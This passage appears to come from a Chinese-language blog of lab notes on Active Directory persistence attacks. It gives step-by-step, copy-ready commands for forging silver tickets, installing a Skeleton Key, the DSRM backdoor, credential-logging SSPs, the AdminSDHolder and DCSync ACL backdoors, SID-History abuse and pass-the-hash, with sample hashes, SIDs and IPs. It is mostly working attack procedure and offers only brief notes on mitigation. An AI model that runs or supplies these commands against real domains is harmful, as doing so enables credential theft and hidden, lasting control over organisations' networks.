<h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要条件</span><br><span class="line">1.域名</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM HASH</span><br><span class="line">6.需要伪造的用户名，可以是任意用户名，一般用administrator来</span><br></pre></td></tr></table></figure></div>

<p>获取基本信息的方法和上面的黄金票据的方法差不多</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SID和所处域参考上面</span><br><span class="line">whoami /user </span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">获取服务账号hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175005403.png"
                      alt="image-20230820175005403"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175306893.png"
                      alt="image-20230820175306893"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175424771.png"
                      alt="image-20230820175424771"
                ></p>
<p>所有信息收集之后便就可以制作白银票据了</p>
<p>清除票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure></div>

<p>使用mimkatz的话就用这条就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div>

<h6 id="伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）"><a href="#伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）" class="headerlink" title="伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）"></a>伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:cifs /rc4:a6ab389a705e066e45eedd34e41f6748 /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180005374.png"
                      alt="image-20230820180005374"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180036419.png"
                      alt="image-20230820180036419"
                ></p>
<h6 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h6><p>制作一个票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:ldap /rc4:a6ab389a705e066e45eedd34e41f6748 /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">只需要把服务名改成/service:ldap即可</span><br><span class="line"></span><br><span class="line">参考:https://blog.csdn.net/weixin_39851261/article/details/112076055</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180343091.png"
                      alt="image-20230820180343091"
                ></p>
<p>mimikatz</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hack-my.com /domain:hack-my.com /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。 需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户 只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180608377.png"
                      alt="image-20230820180608377"
                ></p>
<p>然后获取到</p>
<p>krbtgt的hash值就可以进行下一步的操作了</p>
<p>比如制作黄金票据等</p>
<h2 id="万能票据"><a href="#万能票据" class="headerlink" title="万能票据"></a>万能票据</h2><p>万能密钥是一种持久性的技术，它可以修补域控（lsass进程），使其允许任何用户使用单一没密码进行访问</p>
<p>该攻击是由Dell Secureworks发现的，该软件用户名为Skeleton Key恶意软件中</p>
<p>在域控中安装这个东西之后所有的账户都可以使用同一个密码，同时原有的密码依旧有效，但是重启域控之后就会失效</p>
<h6 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h6><p>通过mimikatz执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>就可以创建一个Skeleton Key域后门密码为mimikatz</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181126557.png"
                      alt="image-20230820181126557"
                ></p>
<p>然后该域控就可以使用mimikatz登陆进去，原密码也还是有效的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181222523.png"
                      alt="image-20230820181222523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181252393.png"
                      alt="image-20230820181252393"
                ></p>
<h6 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h6><p>微软对于这个问题在2014年3月添加了一个LSA保护策略（lsass作为受保护进程运行），可以执行命令开启&#x2F;关闭LSA</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\lSA&quot; /V RunAsPPL /T REG_DWORD /d 1 /f</span><br><span class="line">关闭</span><br><span class="line">reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL</span><br></pre></td></tr></table></figure></div>

<p>开启后，mimikatz就会失效，都无法安装SkeletonKey</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181928443.png"
                      alt="image-20230820181928443"
                ></p>
<p>但是！！</p>
<p>早在2013年10月mimikatz就支持绕过LSA保护。该功能需要mimikatz中的mimidrv.sys文件，命令为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">           !+</span><br><span class="line">           !processprotect /process:lsass.exe /remove</span><br><span class="line">           misc::skeleton</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820182046923.png"
                      alt="image-20230820182046923"
                ></p>
<h2 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h2><p>是目录服务还原模式，是Windows域环境中域控的安全模式启动选项。域控的本地管理员账户也就是DSRM账户，也就是他们的密码是一样的。</p>
<p>每个DC上面都有一个名为Administrator的本地管理员，他的密码就是DSRM的密码</p>
<p>服务器升级成域控的时候就需要DSRM密码（SafeModePassword），而且很少更改</p>
<p>修改DC的配置后，可以通过该用户的NTLM hash访问DC</p>
<p>用途：允许管理员在域环境出现故障时还原，修复，重建活动目录数据库。通过在DC上运行ntdsutil工具可以修改DSRM 的密码</p>
<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>系统要求：在安装了KB961320补丁的Windows Server 2008之后的Windows版本开始支持在DC上使用指定的域账户同步DSRM密码</p>
<p>更改DSRM的密码方式：同步域用户的方式</p>
<p>更改密码指令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入ntdsutil</span><br><span class="line">ntdsutil</span><br><span class="line">#修改DSRM的密码</span><br><span class="line">set DSRM password</span><br><span class="line">#使DSRM的密码和指定域用户的密码同步 eg:sync from domain account [域用户名]</span><br><span class="line">sync from domain account webadmin</span><br><span class="line">#退出</span><br><span class="line">按两次q即可退出(第1次：退出DSRM密码设置模式;第2次退出ntdsutil)</span><br></pre></td></tr></table></figure></div>



<p>需要一个域账户hash</p>
<p>并且需要注意是否会同步域账户（同步DSRM账户后，后门即失效）</p>
<p>域控重启后会失效</p>
<h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><p>获取DSRM以及krbtgt的NTLM hash（就是域管hash信息）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::Debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183251903.png"
                      alt="image-20230820183251903"
                ></p>
<p>更改登陆方式</p>
<p>修改DSRM登陆方式</p>
<p>有三种登陆方式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</span><br><span class="line">1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</span><br><span class="line">2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</span><br></pre></td></tr></table></figure></div>

<p>执行修改为2表示任何情况下都可以使用DSRM账号登陆域控制器</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注册表命令</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /f /v DSRMaDMINlOGONbEHAVIOR /T reg_dword /d 2</span><br><span class="line">#powershell命令</span><br><span class="line">New-Itempeoperty &quot;hklm:\system\currentcontrolset\control\lsa&quot; -name &quot;dsrmadinlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183310906.png"
                      alt="image-20230820183310906"
                ></p>
<p>然后就可以域内主机使用psexec.exe进行连接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.exe hack-my.com/Administrator@192.168.30.10 -hashes :38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184145688.png"
                      alt="image-20230820184145688"
                ></p>
<p>PTH传递攻击</p>
<p>然后就可以使用mimikatz进行（在域成员机器的管理员模式下打开）使用pth创建会话</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:DC /user:administrator /ntlm:38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>

<p>就可以达到权限维持的目的，即使被关闭，也可以再次通过PTH重新调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184756227.png"
                      alt="image-20230820184756227"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184852000.png"
                      alt="image-20230820184852000"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185031985.png"
                      alt="image-20230820185031985"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185050596.png"
                      alt="image-20230820185050596"
                ></p>
<h2 id="自定义安全支持提供程序SSP"><a href="#自定义安全支持提供程序SSP" class="headerlink" title="自定义安全支持提供程序SSP"></a>自定义安全支持提供程序SSP</h2><p>安全支持提供程序（SSP）是一个DLL，为应用程序提供获取经过身份验证的连接的方法，微软的一些SSP包包含了：NTLM Kerbeos Wdigest CredSSP</p>
<p>mimikatz提供了一个自定义SSP-mimilib.dll</p>
<p>SSP入职从计算机的下一次重启开始。此SSP以明文形式在目标服务器上记录本地登录、服务账号和计算机账户密码</p>
<p>凭证的保存路径：C:\Windows\System32\kiwissp.log</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">实现免杀</span><br><span class="line">https://xz.aliyun.com/t/8268</span><br><span class="line">https://xz.aliyun.com/t/8323</span><br></pre></td></tr></table></figure></div>

<p>方法一</p>
<p>将mimilib.dll拖放到system32并将mimilib添加到注册表</p>
<p>但是这个操作是需要修改注册表的，会比较麻烦，且无法远程执行交互式命令，所以就需要远程登陆到对方的主机中来进行执行</p>
<p>优点：永久生效，但是需要重启服务器</p>
<p>将mimikatz中的mimilib.dll上传到目标主机的C:\windows\system32\目录下（注意需要上传对应位数的文件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204725258.png"
                      alt="image-20230820204725258"
                ></p>
<p>命令修改</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看当前注册表中的设置值</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line">#修改注册表中的值</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#CS中修改注册表中的值</span><br><span class="line">shell echo yes | reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204806604.png"
                      alt="image-20230820204806604"
                ></p>
<p>然后重启服务器后会在C:\windows\system32\kiwissp.log记录密码信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205114094.png"
                      alt="image-20230820205114094"
                ></p>
<p>这种方法得重启服务器，有风险</p>
<p>方法二</p>
<p>使用mimikatz，注入lsass</p>
<p>可以使用mimikatz直接进行命令执行，执行后只要等待管理员重新登陆就行了，但是该命令是一次性的，当这台服务器重启之后，那么这条命令就无法再次执行了，详单与重启就失效了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205152872.png"
                      alt="image-20230820205152872"
                ></p>
<p>只要管理员重新登陆就行了</p>
<p>这时候就会在C:\Windows\System32\mimilsa.log获取到登陆的日志，里面会记录着登陆的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205226633.png"
                      alt="image-20230820205226633"
                ></p>
<h2 id="访问控制列表ACL-AdminSDHolder"><a href="#访问控制列表ACL-AdminSDHolder" class="headerlink" title="访问控制列表ACL-AdminSDHolder"></a>访问控制列表ACL-AdminSDHolder</h2><p>AdminSDHolder是位于AD中的系统分区（cn&#x3D;admin）</p>
<p>先得创建一个域用户（得带域前缀，不然是本地账户）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user abc.com\user1 /add</span><br></pre></td></tr></table></figure></div>

<p>添加ACL</p>
<p>删除ACL</p>
<p>手动运行SDProp服务（会一小时执行一次，也可以等）</p>
<p>win2008命令不一样</p>
<p>然后就可以滥用通用访问和完全控制</p>
<p>修改域管组成员</p>
<p>修改域管密码</p>
<p>还可以有更多有趣的ACL可以被滥用。如运行DCSync的能力</p>
<p>域管给域用户添加ACL</p>
<p>执行DCSync</p>
<h2 id="SID-History"><a href="#SID-History" class="headerlink" title="SID-History"></a>SID-History</h2><p>SID即安全标识符，是标识用户、组和计算机账户的唯一号码。SID会在第一次创建账号的时候创建，并且这个SID是唯一的</p>
<p>SIDHistory是为了解决用户在迁移到另一个域的时候权限会改变的问题。比如nihao用户在A域中是域管，但是迁移到B域的时候有时候由于SID值的改变会导致变成普通用户，这时候只要给nihao用户添加一个在A域的SIDHistory值就可以解决这个问题</p>
<p>注意：只有域管有更改SIDHistory的权利</p>
<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>获取所有用户的SID值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure></div>

<p>查看可以知道SID只有后四位是不同的，这里也代表着不同的权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205254523.png"
                      alt="image-20230820205254523"
                ></p>
<p>获取某个用户的SID值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#利用powershell执行</span><br><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser boy -Properties sidhistory</span><br></pre></td></tr></table></figure></div>



<p>赋予某个用户administrator权限</p>
<p>这里赋予boy权限，也就是将administrator的SID值导入boy的SID-History中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#利用mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:boy /new:administrator</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820210219148.png"
                      alt="image-20230820210219148"
                ></p>
<p>报错了，这个查看了一下是mimkatz版本的原因，网上说尝试更换旧版本2.1.1解决，但是更换了还是不行</p>
<p>查看boy的SID值看是否具备administrator权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser boy -Properties sidhistory</span><br></pre></td></tr></table></figure></div>

<p>这边就可以正常访问域控中的资源了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.30.10\c$</span><br></pre></td></tr></table></figure></div>



<p>总结：这个方法只要不去修改域账号就一直有效的，在域控的用户中心中是无法查询到变化的，隐蔽性较高	</p>
<h3 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h3><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的system容器下</p>
<p>一般作为某些受保护对象的安全模板，防止这些对象遭受恶意的修改或者滥用</p>
<p>受保护对象通常包括特权用户和受保护的组，Administrator、Domain Admins、Enterprise Admin以及Schema Admins等</p>
<p>在活动目录中用adminCount用来标记特权用户和组，通常特权用户和组属性被设为1</p>
<p>通过AdFind查询adminCount属性设置为1的对象，可以找到所有受AdminSDHolder保护的特权和组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">列举受保护的用户</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">列举搜保护的组</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820213056794.png"
                      alt="image-20230820213056794"
                ></p>
<p>默认下，系统会定期检查（60分钟）受保护对象的安全描述符，将受保护对的ACL和AdminSDHolder的ACL相比较，如果不一致将会强制修改为AdminSDHolder的ACL（通过SDProp进程来完成检查）</p>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以篡改AdminADHolder的ACL配置，然后60分钟后SDPorp调用将会强制改变受保护对象的ACL，以此建立一个隐蔽的后门，需要域管理员权限</p>
<p>执行命令，通过powerView向AdminSDHolder容器添加一个ACL，使普通的域用户拥有对AdminSDHolder的完全控制权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820215120175.png"
                      alt="image-20230820215120175"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820214934231.png"
                      alt="image-20230820214934231"
                ></p>
<p>等60分钟让SDProp生效，也可以用指令使其时间缩短，这个时候boy用户就可以向Domain Admins等关键用户组成员添加成员</p>
<p>清除这个权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity boy -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>PasswordChangeNotify这个东西是windows中为了重置密码，windows会检查新密码的复杂性是否够安全，如果符合要求LSA就会调用它在系统中同步密码</p>
<p>调用的过程中密码是明文传输，所以可以利用KOOK技术在调用过程中劫持密码</p>
<p>主要就是利用域用户更改密码的时候进行利用的</p>
<p>函数PasswordChangeNotify存在于rassfm.dll中，该dll可以理解为Remote Access Subauthentication Dll(远程访问子系统认证)，只存在于Server系统中。可以利用dumpbin查看rassfm.dll导出函数来验证</p>
<h3 id="DCSync技术"><a href="#DCSync技术" class="headerlink" title="DCSync技术"></a>DCSync技术</h3><h3 id="利用DCSync导出域内hash"><a href="#利用DCSync导出域内hash" class="headerlink" title="利用DCSync导出域内hash"></a>利用DCSync导出域内hash</h3><p>在一个域环境中可以有多台域控，每台域控各自存储着一份所在域的活动目录的可写副本</p>
<p>对目录的任何修改都可以从源域控中同步到其他域控中</p>
<p>当一个域控想从其他域控获取数据时，客户端域控会向服务端域控获取DSGetNCChanges请求，这个请求的响应包含着更新</p>
<p>一般15分钟会有一次域同步</p>
<p>DCSync就是利用域控同步原理，通过Directory Replication Service服务的IDL——DRSGetNCChanges接口向域控发起请求</p>
<p>可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控的数据</p>
<p>注意：此攻击并不适用于只读域控（RODC）</p>
<h4 id="mimikatz下的利用"><a href="#mimikatz下的利用" class="headerlink" title="mimikatz下的利用"></a>mimikatz下的利用</h4><p>mimikatz在2015年8月更新中添加了DCSync功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内指定用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png"
                      alt="image-20230325162902673"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内所有用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png"
                      alt="image-20230325163104824"
                ></p>
<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png"
                      alt="image-20230325163210977"
                ></p>
<h4 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h4><p>Impacket中的secretsdump.py可以支持DCSync技术导出域控中的用户哈希</p>
<p>该工具可以使用高权限用户的密码来实现从域外主机读取域内主机的hash值，同时可以通过Dcsync或卷影复制的方法，NTDS.dit的中导出所有用户的hash值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator(账号):Admin!@#45(密码)@192.168.81.140(域控IP) -just-dc-user &quot;hack-my\administrator&quot;</span><br></pre></td></tr></table></figure></div>

<p>导出域管理员Administrator用户的hash值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png"
                      alt="image-20230325165120864"
                ></p>
<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限之后，可以手动为域内标准用户赋予DCSync操作权限，从而实现隐蔽发域后门</p>
<p>通过powershell中的PowerView.ps1脚本实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">为域用户Alice添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111406479.png"
                      alt="image-20230821111406479"
                ></p>
<p>添加成功后可以通过Alice用户导出域内用户的哈希</p>
<p><code>python3 secretsdump.py hack-my.com/administrator:Admin\!\@\#45@192.168.81.141 -just-dc-user &quot;hack-my\administrator&quot;</code></p>
<p>这边我直接使用mimikatz执行操作</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111827314.png"
                      alt="image-20230821111827314"
                ></p>
<p>清除权限</p>
<p><code>Remove-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</code></p>
<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow技术同样利用了域控之间的DRS数据同步</p>
<p>但是它与DCSync思路相反</p>
<p>它是利用创建一个恶意的域控，利用域控之间的同步复制，将预先设定的对象和对象属性注入正在运行的合法域控中，以此来创建域后门等</p>
<p>通过DCShadow修改普通域用户Alice来演示攻击原理</p>
